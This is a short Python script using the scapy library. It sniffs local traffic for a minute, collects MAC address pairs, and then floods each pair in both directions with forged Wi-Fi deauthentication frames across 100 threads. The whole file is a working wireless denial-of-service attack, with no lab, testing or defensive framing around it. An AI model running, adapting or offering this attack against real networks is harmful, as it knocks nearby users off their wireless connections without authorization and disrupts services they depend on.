from scapy.all import *
import concurrent.futures

def bad(device, wifi):
    interface = "en0"
    packet = RadioTap() / Dot11(addr1=device, addr2=wifi, addr3=wifi) / Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.001)
    print("deauth: wifi:{}, device:{}".format(wifi, device))

def packet_handler(packet):
    global packet_list
    if Ether in packet:
        src_mac = packet[Ether].src
        dst_mac = packet[Ether].dst
        data = packet[Ether].payload
        packet_list.append((src_mac, dst_mac))

packet_list = []
sniff(iface="en0", prn=packet_handler, filter="", timeout=60)

with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    tasks = [executor.submit(bad, pack[0], pack[1]) for pack in packet_list]
    tasks.extend([executor.submit(bad, pack[1], pack[0]) for pack in packet_list])
    concurrent.futures.wait(tasks)

print('done')
